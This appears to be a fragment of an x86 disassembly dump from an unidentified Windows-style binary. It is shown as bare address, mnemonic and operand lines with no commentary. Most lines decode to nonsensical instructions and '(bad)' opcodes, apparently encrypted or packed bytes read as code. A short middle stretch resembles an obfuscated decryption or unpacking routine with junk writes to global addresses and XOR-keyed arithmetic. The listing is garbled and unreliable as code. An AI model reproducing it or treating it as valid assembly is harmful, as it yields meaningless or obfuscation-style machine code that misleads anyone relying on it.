  40da7e:	fdiv   QWORD PTR [ebp-0x781a70ce]
  40da84:	xor    ebx,DWORD PTR [ecx-0x4f]
  40da87:	std    
  40da88:	ins    BYTE PTR es:[edi],dx
  40da89:	clc    
  40da8a:	pop    edi
  40da8b:	idiv   ah
  40da8d:	fsubr  QWORD PTR [ebx]
  40da8f:	adc    al,0x53
  40da91:	(bad)  
  40da92:	addr16 retf 
  40da94:	push   es
  40da95:	pop    ss
  40da96:	aas    
  40da97:	inc    ecx
  40da98:	pop    es
  40da99:	scas   al,BYTE PTR es:[edi]
  40da9a:	ins    BYTE PTR es:[edi],dx
  40da9b:	call   0x7f6c:0xaf29f7ab
  40daa2:	scas   eax,DWORD PTR es:[edi]
  40daa3:	and    dl,BYTE PTR [ebp+0x3f7356a1]
  40daa9:	sbb    ch,BYTE PTR [esi]
  40daab:	fmul   QWORD PTR [ebx-0x35]
  40daae:	fisttp DWORD PTR [eax-0x36a84a05]
  40dab4:	or     dh,BYTE PTR [edx*8-0x630754e7]
  40dabb:	jno    0x40da9b
  40dabd:	cmp    ch,BYTE PTR [ecx+0x786e9671]
  40dac3:	fdivp  st(2),st
  40dac5:	or     eax,0xe59b33bd
  40daca:	fimul  DWORD PTR [eax+0x58]
  40dacd:	or     al,BYTE PTR [ebx]
  40dacf:	mov    ecx,0x9e5427f6
  40dad4:	stc    
  40dad5:	or     edi,DWORD PTR [ecx]
  40dad7:	cmp    eax,0xbabb5ef9
  40dadc:	aaa    
  40dadd:	inc    eax
  40dade:	or     BYTE PTR [edi-0x2d],cl
  40dae1:	jb     0x40db4c
  40dae3:	ret    0xac25
  40dae6:	loope  0x40da7d
  40dae8:	lods   eax,DWORD PTR ds:[esi]
  40dae9:	mov    ds,WORD PTR [esi+0x7ca21b0d]
  40daef:	popf   
  40daf0:	xchg   ebx,eax
  40daf1:	test   BYTE PTR [ebx],bh
  40daf3:	cdq    
  40daf4:	or     ah,BYTE PTR [ebx+0x4b163b29]
  40dafa:	jle    0x40db13
  40dafc:	mov    ss,WORD PTR [eax+0x86165fe]
  40db02:	retf   0xec28
  40db05:	std    
  40db06:	mov    dl,0xeb
  40db08:	outs   dx,DWORD PTR ds:[esi]
  40db09:	adc    eax,0xbdead08e
  40db0e:	iret   
  40db0f:	adc    DWORD PTR [ecx-0x46],ebx
  40db12:	cmp    DWORD PTR [esp+ebx*8+0x1d3bd406],eax
  40db19:	and    DWORD PTR [edi+0x31b2740],ecx
  40db1f:	xchg   ebx,eax
  40db20:	pusha  
  40db21:	ret    
  40db22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db23:	sub    bl,BYTE PTR [ebx+0x4611d40b]
  40db29:	shl    BYTE PTR [ebp+eax*8-0x88deb1e],1
  40db30:	jmp    0x40dafc
  40db32:	dec    edx
  40db33:	push   0x41
  40db35:	out    0x90,al
  40db37:	jbe    0x40db93
  40db39:	lock fcomp DWORD PTR [edx+edx*8-0x528fadb2]
  40db41:	dec    edx
  40db42:	fwait
  40db43:	cmp    DWORD PTR [eax-0x2ad1449b],edi
  40db49:	push   0xf41e2b5a
  40db4e:	ins    BYTE PTR es:[edi],dx
  40db4f:	pop    eax
  40db50:	cmp    al,0x88
  40db52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db53:	dec    ebx
  40db54:	and    esp,DWORD PTR [esi]
  40db56:	imul   ebx,DWORD PTR ds:0xaac3ed2b,0xffffffcb
  40db5d:	stos   BYTE PTR es:[edi],al
  40db5e:	clc    
  40db5f:	mov    ah,0xf4
  40db61:	jns    0x40db6b
  40db63:	and    ch,BYTE PTR [ebx+0x43]
  40db66:	push   es
  40db67:	iret   
  40db68:	int3   
  40db69:	sub    cl,BYTE PTR [eax]
  40db6b:	sub    bl,0x70
  40db6e:	neg    BYTE PTR [ebp+0x6259ce46]
  40db74:	and    eax,0xf1a12931
  40db79:	rol    BYTE PTR [eax-0x7],1
  40db7c:	test   BYTE PTR [ebx+0x2b],ah
  40db7f:	xlat   BYTE PTR ds:[ebx]
  40db80:	dec    ecx
  40db81:	hlt    
  40db82:	adc    bp,WORD PTR [ecx-0x35fb896d]
  40db89:	adc    edi,DWORD PTR [edi-0x27]
  40db8c:	push   es
  40db8d:	mov    edi,0xbe5570b7
  40db92:	mov    ch,0x79
  40db94:	fisttp DWORD PTR [esi]
  40db96:	out    0xce,eax
  40db98:	mov    cl,BYTE PTR [esi-0xb]
  40db9b:	dec    edi
  40db9c:	outs   dx,DWORD PTR ds:[esi]
  40db9d:	aas    
  40db9e:	cld    
  40db9f:	xor    al,0x88
  40dba1:	push   edi
  40dba2:	test   DWORD PTR [edi],0x9daf347f
  40dba8:	cwde   
  40dba9:	inc    eax
  40dbaa:	sub    ebp,DWORD PTR [edi]
  40dbac:	lds    ecx,FWORD PTR [edi-0x36]
  40dbaf:	mov    DWORD PTR [edx+0x4f852b0f],ebx
  40dbb5:	sbb    edi,edx
  40dbb7:	sbb    bl,bh
  40dbb9:	rcl    DWORD PTR [eax-0xf82bf67],cl
  40dbbf:	in     al,dx
  40dbc0:	adc    BYTE PTR [edx],ah
  40dbc2:	(bad)  
  40dbc3:	not    DWORD PTR [ecx]
  40dbc5:	ret    0x32c4
  40dbc8:	test   al,0xb
  40dbca:	mov    al,0x9a
  40dbcc:	sahf   
  40dbcd:	(bad)  
  40dbce:	hlt    
  40dbcf:	inc    esp
  40dbd0:	mov    esp,0x6585b26
  40dbd5:	xchg   esp,eax
  40dbd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd7:	dec    edi
  40dbd8:	xor    al,0x98
  40dbda:	cdq    
  40dbdb:	addr16 mov ebx,?
  40dbde:	in     al,dx
  40dbdf:	(bad)  
  40dbe0:	jo     0x40dbf6
  40dbe2:	aad    0x2d
  40dbe4:	push   es
  40dbe5:	test   BYTE PTR [edx+0xa0946c7],0x57
  40dbec:	pop    esi
  40dbed:	add    DWORD PTR [ebx-0x762efe65],eax
  40dbf3:	dec    edi
  40dbf4:	cmc    
  40dbf5:	mov    bl,0xe7
  40dbf7:	js     0x40dbba
  40dbf9:	out    0x91,al
  40dbfb:	push   0xffffffb1
  40dbfd:	mov    al,ds:0x3c0d75dd
  40dc02:	jno    0x40dc21
  40dc04:	push   ebx
  40dc05:	pop    edx
  40dc06:	ror    BYTE PTR [eax+0xd6786bd],1
  40dc0c:	ins    BYTE PTR es:[edi],dx
  40dc0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc0e:	cmp    BYTE PTR [ecx],bh
  40dc10:	test   eax,0x27639556
  40dc15:	hlt    
  40dc16:	je     0x40dc38
  40dc18:	and    BYTE PTR [ebx],bl
  40dc1a:	jmp    0xb399f1f7
  40dc1f:	gs pusha 
  40dc21:	into   
  40dc22:	outs   dx,DWORD PTR ds:[esi]
  40dc23:	cwde   
  40dc24:	mov    ch,0x67
  40dc26:	inc    ebp
  40dc27:	sahf   
  40dc28:	mov    dl,0x21
  40dc2a:	ror    bl,0x14
  40dc2d:	mov    edi,0x8c109203
  40dc32:	add    edx,DWORD PTR [edx-0x27c2f046]
  40dc38:	ret    0x4f78
  40dc3b:	enter  0xdb12,0xc6
  40dc3f:	mov    dh,0x90
  40dc41:	std    
  40dc42:	sar    BYTE PTR [esp+esi*1-0x1cc223bb],1
  40dc49:	dec    ebp
  40dc4a:	aaa    
  40dc4b:	inc    esi
  40dc4c:	imul   ebp,DWORD PTR [edx+0x7b909869],0xffffffcf
  40dc53:	out    0x51,al
  40dc55:	push   ebx
  40dc56:	xchg   ecx,eax
  40dc57:	mov    eax,0xb6c22809
  40dc5c:	test   BYTE PTR [ecx+0x41],0x45
  40dc60:	das    
  40dc61:	test   BYTE PTR [esi+0x60],bh
  40dc64:	in     al,dx
  40dc65:	and    cl,BYTE PTR [eax]
  40dc67:	xor    eax,0x5d4c9412
  40dc6c:	movq   mm5,QWORD PTR ds:0xaf4ac0d2
  40dc74:	push   esp
  40dc75:	imul   ebp,esp,0x8d456496
  40dc7b:	mov    esp,0x30b68d8c
  40dc80:	cld    
  40dc81:	aaa    
  40dc82:	dec    esi
  40dc83:	je     0x40dc95
  40dc85:	push   ecx
  40dc86:	(bad)  
  40dc87:	mov    ch,0x22
  40dc89:	in     eax,0x65
  40dc8b:	call   0xa279d400
  40dc90:	jno    0x40dca8
  40dc92:	imul   esp,ebx,0xffffffae
  40dc95:	inc    edx
  40dc96:	out    dx,al
  40dc97:	shl    WORD PTR [ecx],1
  40dc9a:	push   eax
  40dc9b:	mov    bl,0x9
  40dc9d:	int    0xf7
  40dc9f:	cmp    edi,0xfe408f6d
  40dca5:	pop    ss
  40dca6:	call   0x36a43aaa
  40dcab:	test   DWORD PTR cs:[ecx],0x87f7a429
  40dcb2:	in     eax,dx
  40dcb3:	mov    ebx,DWORD PTR [ebx-0x2b]
  40dcb6:	mov    dh,0x8e
  40dcb8:	jmp    0x40dc63
  40dcba:	in     eax,dx
  40dcbb:	and    eax,0xb80835d5
  40dcc0:	inc    esp
  40dcc1:	rcl    BYTE PTR [ecx-0xd],cl
  40dcc4:	out    0x12,al
  40dcc6:	cld    
  40dcc7:	not    DWORD PTR [edx]
  40dcc9:	ficom  DWORD PTR [edx-0x1]
  40dccc:	inc    ebx
  40dccd:	cmp    al,0x2
  40dccf:	(bad)  
  40dcd0:	and    edx,DWORD PTR [ebx+0x37]
  40dcd3:	rol    BYTE PTR [esi-0x10],1
  40dcd6:	mov    ds:0x2dec9843,ax
  40dcdc:	mov    edx,0x6bc85eaf
  40dce1:	sbb    eax,0x8da4a9e5
  40dce6:	retf   0xa90d
  40dce9:	mov    bl,dh
  40dceb:	fild   QWORD PTR [esi+ebx*1]
  40dcee:	call   0x5e5b:0xdf0d9ee2
  40dcf5:	call   0x2b799305
  40dcfa:	and    al,0xcd
  40dcfc:	add    ebx,DWORD PTR [edi]
  40dcfe:	xor    dh,ch
  40dd00:	cmp    BYTE PTR [edx],cl
  40dd02:	xor    al,0x1e
  40dd04:	loop   0x40dd6a
  40dd06:	push   esi
  40dd07:	loop   0x40dd6b
  40dd09:	xor    BYTE PTR [ebp-0x681a2318],cl
  40dd0f:	jns    0x40dd79
  40dd11:	pop    ebp
  40dd12:	aam    0xe3
  40dd14:	enter  0xc55c,0x48
  40dd18:	add    eax,0xe941f694
  40dd1d:	jae    0x40dcd3
  40dd1f:	gs popf 
  40dd21:	nop
  40dd22:	jbe    0x40dd55
  40dd24:	push   ecx
  40dd25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd26:	mul    ecx
  40dd28:	inc    eax
  40dd29:	or     dl,BYTE PTR [edi]
  40dd2b:	repz jb 0x40dd03
  40dd2e:	addr16 ja 0x40dd70
  40dd31:	or     bh,ch
  40dd33:	mov    ah,0xb3
  40dd35:	ins    BYTE PTR es:[edi],dx
  40dd36:	hlt    
  40dd37:	sub    ecx,DWORD PTR [eax+0x16]
  40dd3a:	sbb    esi,DWORD PTR [ebx-0x6ffddb5f]
  40dd40:	or     edi,DWORD PTR [eax-0x3b]
  40dd43:	retf   0xbf4f
  40dd46:	ja     0x40dd71
  40dd48:	mov    ds:0x2196e19e,eax
  40dd4d:	jecxz  0x40dd5d
  40dd4f:	scas   eax,DWORD PTR es:[edi]
  40dd50:	jnp    0x40dce4
  40dd52:	jmp    0x3239a8c7
  40dd57:	fwait
  40dd58:	mov    DWORD PTR [ecx],eax
  40dd5a:	dec    DWORD PTR [eax+0x21]
  40dd5d:	lods   al,BYTE PTR ds:[esi]
  40dd5e:	inc    edi
  40dd5f:	out    dx,al
  40dd60:	div    bh
  40dd62:	jmp    0x40dd98
  40dd64:	in     eax,dx
  40dd65:	std    
  40dd66:	inc    esp
  40dd67:	jne    0x40ddad
  40dd69:	and    dl,dh
  40dd6b:	nop
  40dd6c:	xchg   esi,eax
  40dd6d:	mov    ebp,0x4c0c8546
  40dd72:	addr16 sbb al,0x4b
  40dd75:	inc    edx
  40dd76:	cmp    BYTE PTR [edi],bl
  40dd78:	ins    DWORD PTR es:[edi],dx
  40dd79:	xchg   ecx,eax
  40dd7a:	mov    ecx,0x1580acdc
  40dd7f:	xchg   BYTE PTR [bp+di-0x7d],al
  40dd83:	ror    BYTE PTR [ebp+0x5048f1ab],1
  40dd89:	out    dx,eax
  40dd8a:	sbb    DWORD PTR [eax-0x1eac3d47],ebx
  40dd90:	test   eax,0x32045081
  40dd95:	rol    dh,1
  40dd97:	addr16 into 
  40dd99:	in     eax,0x30
  40dd9b:	jns    0x40dd69
  40dd9d:	ror    BYTE PTR [ebx-0x21bfc63f],cl
  40dda3:	stos   DWORD PTR es:[edi],eax
  40dda4:	push   0xf491d73
  40dda9:	adc    al,0xdd
  40ddab:	jb     0x40ddd1
  40ddad:	add    al,0x44
  40ddaf:	push   0x3b
  40ddb1:	inc    ebx
  40ddb2:	xlat   BYTE PTR ds:[ebx]
  40ddb3:	pop    ebp
  40ddb4:	shl    DWORD PTR [esp+esi*1],0xcd
  40ddb8:	mov    ecx,0xff9ab313
  40ddbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddbe:	mov    WORD PTR [ebx],?
  40ddc0:	and    BYTE PTR [ecx],cl
  40ddc2:	xor    DWORD PTR [esi+eiz*1],esp
  40ddc5:	dec    edi
  40ddc6:	iret   
  40ddc7:	add    ecx,DWORD PTR [esi+0x588fcb42]
  40ddcd:	mov    BYTE PTR [edx-0x6c],ah
  40ddd0:	into   
  40ddd1:	repz scas eax,DWORD PTR es:[edi]
  40ddd3:	or     dh,BYTE PTR [ebp-0x5135b704]
  40ddd9:	repnz pop es
  40dddb:	pop    eax
  40dddc:	stos   DWORD PTR es:[edi],eax
  40dddd:	add    DWORD PTR [eax],esi
  40dddf:	adc    ecx,DWORD PTR ds:0xabddbd59
  40dde5:	in     al,0x68
  40dde7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dde8:	outs   dx,BYTE PTR ds:[esi]
  40dde9:	inc    edi
  40ddea:	enter  0x2336,0x79
  40ddee:	daa    
  40ddef:	mov    esi,0xa3524f6c
  40ddf4:	popa   
  40ddf5:	pop    ds
  40ddf6:	ja     0x40de75
  40ddf8:	cmp    edx,DWORD PTR [edx-0xf]
  40ddfb:	inc    ecx
  40ddfc:	icebp  
  40ddfd:	fld    TBYTE PTR [ebx-0x5864deb2]
  40de03:	mov    ebp,0x139a8c1d
  40de08:	fld    TBYTE PTR [ecx-0x1b]
  40de0b:	fcom   DWORD PTR [ebp+0x536d3517]
  40de11:	aas    
  40de12:	jmp    0x40de24
  40de14:	cmp    eax,0x7b0fc4f7
  40de19:	xchg   edx,eax
  40de1a:	jecxz  0x40dde3
  40de1c:	scas   al,BYTE PTR es:[edi]
  40de1d:	jne    0x40de50
  40de1f:	out    dx,eax
  40de20:	js     0x40de10
  40de22:	mov    dh,BYTE PTR [esi]
  40de24:	stos   BYTE PTR es:[edi],al
  40de25:	test   DWORD PTR [ebx],edx
  40de27:	sub    eax,0x2d4c6da9
  40de2c:	int    0x44
  40de2e:	cmp    DWORD PTR [ecx],edi
  40de30:	mov    ah,0xb3
  40de32:	inc    edx
  40de33:	jmp    0x8efadd52
  40de38:	push   esi
  40de39:	and    cl,BYTE PTR [ebx-0x6f]
  40de3c:	fidiv  DWORD PTR [edx-0x53]
  40de3f:	pop    edx
  40de40:	or     al,0x6f
  40de42:	clc    
  40de43:	dec    ebp
  40de44:	pop    es
  40de45:	out    0x75,al
  40de47:	stos   BYTE PTR es:[edi],al
  40de48:	ds jg  0x40de18
  40de4b:	push   0x751c32ce
  40de50:	mov    eax,DWORD PTR [ebp-0x4]
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42f00c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x431000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x433000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x432010
  40de84:	or     DWORD PTR ds:0x43000c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x432014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x430014,0x42f028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x43101c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x431010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x43201c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x433010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x43201c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x42f020,0x1c
  40defb:	cmp    DWORD PTR ds:0x42f020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x42f020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x42b020
  40df28:	cmp    DWORD PTR ds:0x42f020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x42f020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x42f020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x42f020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x42f020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0xd1
  40dfd4:	cwde   
  40dfd5:	mov    cl,0x49
  40dfd7:	(bad)
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x56]
  40dfe0:	xor    dh,dl
  40dfe2:	sahf   
  40dfe3:	inc    BYTE PTR [edi+0x49c19ab1]
  40dfe9:	data16 shr ah,1
  40dfec:	ror    BYTE PTR [ebx-0xc],0x1f
  40dff0:	mov    edi,cs
  40dff2:	data16 mov BYTE PTR [ebx],dl
  40dff5:	jge    0x40dfac
  40dff7:	jg     0x40dfa8
  40dff9:	or     eax,0x6a0bfab5
  40dffe:	or     ebp,DWORD PTR [esi]
  40e000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e001:	mov    edi,0x9cbb6db9
  40e006:	xor    al,0xbf
  40e008:	inc    ecx
  40e009:	stc    
  40e00a:	cmp    DWORD PTR [ebx-0x5946840b],0x87360933
  40e014:	push   0xffffffc8
  40e016:	jne    0x40dffe
  40e018:	cli    
  40e019:	adc    BYTE PTR [esi],ah
  40e01b:	and    al,dl
  40e01d:	js     0x40dffc
  40e01f:	cs mov ebx,0x171de2b3
  40e025:	xchg   edi,eax
  40e026:	aaa    
  40e027:	sub    eax,0x7dbf6935
  40e02c:	cli    
  40e02d:	jmp    0x8593e973
  40e032:	aam    0x6
  40e034:	add    cl,BYTE PTR [edi+0x62214a6f]
  40e03a:	sub    edi,DWORD PTR [esi]
  40e03c:	sub    eax,0xa3aa6248
  40e041:	dec    ebx
  40e042:	cmp    DWORD PTR [esi-0x32365107],ebx
  40e048:	dec    ecx
  40e049:	sub    al,0x4e
  40e04b:	jae    0x40e027
  40e04d:	or     dh,BYTE PTR [edx+0x3e6315f]
  40e053:	ret    0x4835
  40e056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e057:	mov    bh,0x10
  40e059:	adc    DWORD PTR ds:0x5489e645,edx
  40e05f:	pop    edx
  40e060:	(bad)  
  40e061:	lahf   
  40e062:	sahf   
  40e063:	mov    ds:0xec11e9a3,eax
  40e068:	sbb    bl,BYTE PTR [ecx+0x50565416]
  40e06e:	jge    0x40e0e8
  40e070:	ja     0x40dffd
  40e072:	ror    BYTE PTR [edi],1
  40e074:	cwde   
  40e075:	mov    bl,BYTE PTR [ecx+0x2a]
  40e078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e079:	repz sbb eax,DWORD PTR [edi+ebp*1-0x74]
  40e07e:	cli    
  40e07f:	inc    esi
  40e080:	push   es
  40e081:	rol    DWORD PTR [eax],0x59
  40e084:	mov    eax,ds:0xa48379e6
  40e089:	test   bh,ch
  40e08b:	std    
  40e08c:	popf   
  40e08d:	xchg   BYTE PTR [eax-0x10b7a0e7],al
  40e093:	cdq    
  40e094:	in     eax,0xbf
  40e096:	sbb    eax,DWORD PTR [edi]
  40e098:	xchg   edi,eax
  40e099:	test   al,0x50
  40e09b:	dec    edx
  40e09c:	mov    bl,0xe2
  40e09e:	and    eax,0x73999df8
  40e0a3:	ror    BYTE PTR ds:0xf56e45d8,0x95
  40e0aa:	ds push ecx
  40e0ac:	jno    0x40e09e
  40e0ae:	push   cs
  40e0af:	(bad)  
  40e0b0:	mov    DWORD PTR [edx],edx
  40e0b2:	xor    ebp,DWORD PTR [eax+0x63]
  40e0b5:	mov    dl,0xb4
  40e0b7:	fild   WORD PTR [edx-0x6b02106d]
  40e0bd:	icebp  
  40e0be:	push   eax
  40e0bf:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c1:	leave  
  40e0c2:	cld    
  40e0c3:	(bad)  
  40e0c4:	cmp    al,0x3e
  40e0c6:	outs   dx,DWORD PTR ds:[esi]
  40e0c7:	lahf   
  40e0c8:	(bad)  
  40e0ca:	cmp    BYTE PTR [eax-0x67],dl
  40e0cd:	sahf   
  40e0ce:	outs   dx,BYTE PTR ds:[esi]
  40e0cf:	loope  0x40e110
  40e0d1:	mov    WORD PTR [esi],es
  40e0d3:	xor    eax,esi
  40e0d5:	cs xor edx,esp
  40e0d8:	push   ebp
  40e0d9:	sub    al,0x4e
  40e0db:	loope  0x40e077
  40e0dd:	ins    BYTE PTR es:[edi],dx
  40e0de:	imul   edi,DWORD PTR [edx],0x7f
  40e0e1:	pop    esi
  40e0e2:	pop    ds
  40e0e3:	sbb    al,0x60
  40e0e5:	out    0x44,eax
  40e0e7:	scas   al,BYTE PTR es:[edi]
  40e0e8:	popf   
  40e0e9:	sub    eax,0x2035d90
  40e0ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0ef:	imul   ebp,DWORD PTR [ecx],0x94876728
  40e0f5:	push   ebp
  40e0f6:	jno    0x40e098
  40e0f8:	xor    al,0x71
  40e0fa:	gs push edx
  40e0fc:	mov    cl,0xdf
  40e0fe:	jmp    0x80171f80
  40e103:	aaa    
  40e104:	fidiv  DWORD PTR [ebp+0x72439c6f]
  40e10a:	adc    ebx,edi
  40e10c:	jle    0x40e0d0
  40e10e:	push   es
  40e10f:	inc    esp
  40e110:	xor    BYTE PTR [esi+0x16],dh
  40e113:	popa   
  40e114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e115:	inc    esi
  40e116:	daa    
  40e117:	test   DWORD PTR [eax+ecx*4+0x73a2181c],ebp
  40e11e:	inc    ecx
  40e11f:	gs push ebx
  40e121:	aaa    
  40e122:	lods   eax,DWORD PTR ds:[esi]
  40e123:	ja     0x40e139
  40e125:	push   0xe960c032
  40e12a:	pop    esi
  40e12b:	je     0x40e136
  40e12d:	jmp    0x95af:0x31968bfd
  40e134:	jp     0x40e0c5
  40e136:	jl     0x40e0e8
  40e138:	and    cl,BYTE PTR cs:[edi+0x5f1a483c]
  40e13f:	(bad)  
  40e140:	scas   eax,DWORD PTR es:[edi]
  40e141:	call   0x5c2ceefa
  40e146:	pop    edi
  40e147:	enter  0x3520,0xee
  40e14b:	mov    cl,0x53
  40e14d:	cld    
  40e14e:	mov    ah,0x7
  40e150:	aaa    
  40e151:	and    al,0x60
  40e153:	out    0x5c,eax
  40e155:	(bad)  
  40e156:	mov    al,dh
  40e158:	xchg   al,dl
  40e15a:	sub    DWORD PTR [ebx],edi
  40e15c:	mov    DWORD PTR [ecx+0x3902127d],0x4570015d
  40e166:	jbe    0x40e136
  40e168:	adc    al,0x17
  40e16a:	and    BYTE PTR [edi+0x592f75d7],0x7d
  40e171:	(bad)  [esi]
  40e173:	shl    bh,1
  40e175:	adc    dl,BYTE PTR [edi-0x54]
  40e178:	stc    
  40e179:	add    DWORD PTR [ecx-0x12ad3786],edx
  40e17f:	es xchg al,bl
  40e182:	and    eax,0x3a6224a2
  40e187:	cli    
  40e188:	shl    ah,0x8d
  40e18b:	(bad)  
  40e18c:	jae    0x40e116
  40e18e:	cmp    BYTE PTR ss:[ebx-0x1b566e26],dl
  40e195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e196:	stos   DWORD PTR es:[edi],eax
  40e197:	add    edi,edx
  40e199:	cmp    ebp,ecx
  40e19b:	push   cs
  40e19c:	and    DWORD PTR [ecx-0x3dd8dfe],ebx
  40e1a2:	or     al,BYTE PTR [ebp+eiz*2-0xf]
  40e1a6:	mov    ch,0xda
  40e1a8:	fcomi  st,st(5)
  40e1aa:	dec    esp
  40e1ab:	cdq    
  40e1ac:	mov    ds:0x32d286d6,al
  40e1b1:	xor    ebx,DWORD PTR ds:0x1b7b8046
  40e1b7:	ins    BYTE PTR es:[edi],dx
  40e1b8:	popf   
  40e1b9:	cmp    al,0x0
  40e1bb:	pusha  
  40e1bc:	mov    eax,0x4cae4961
  40e1c1:	icebp  
  40e1c2:	cmp    al,BYTE PTR [ecx]
  40e1c4:	dec    ebx
  40e1c5:	pcmpgtw mm4,QWORD PTR [edx]
  40e1c8:	inc    esp
  40e1c9:	aaa    
  40e1ca:	icebp  
  40e1cb:	fbld   TBYTE PTR [esp+esi*2-0x53]
  40e1cf:	cs jo  0x40e157
  40e1d2:	push   esi
  40e1d3:	out    0xb3,eax
  40e1d5:	(bad)  
  40e1d6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1d8:	pop    ds
  40e1d9:	cld    
  40e1da:	(bad)  
  40e1db:	pusha  
  40e1dc:	int3   
  40e1dd:	jne    0x40e17f
  40e1df:	inc    ebp
  40e1e0:	xchg   ecx,eax
  40e1e1:	pop    ss
  40e1e2:	mov    ch,0x7
  40e1e4:	and    al,0x5d
  40e1e6:	xchg   esp,eax
  40e1e7:	into   
  40e1e8:	xor    cl,cl
  40e1ea:	(bad)  
  40e1eb:	mov    bh,0x68
  40e1ed:	les    ebp,FWORD PTR ds:0x8040801e
  40e1f3:	aas    
  40e1f4:	jae    0x40e255
  40e1f6:	xchg   DWORD PTR [esi-0x429a5028],edi
  40e1fc:	mov    esp,0xdee2526
  40e201:	ins    BYTE PTR es:[edi],dx
  40e202:	sbb    edx,DWORD PTR [edi-0x45]
  40e205:	push   ds
  40e206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e207:	jno    0x40e274
  40e209:	in     al,0x1a
  40e20b:	pushf  
  40e20c:	jmp    0x40e246
  40e20e:	inc    ebp
  40e20f:	hlt    
  40e210:	add    edi,DWORD PTR [esi+0x40fce472]
  40e216:	pop    eax
  40e217:	pop    ss
  40e218:	test   BYTE PTR [esi-0x3b723aba],dl
  40e21e:	mov    edi,0x14d50305
  40e223:	inc    esp
  40e224:	cwde   
  40e225:	push   ecx
  40e226:	es sub al,0xe6
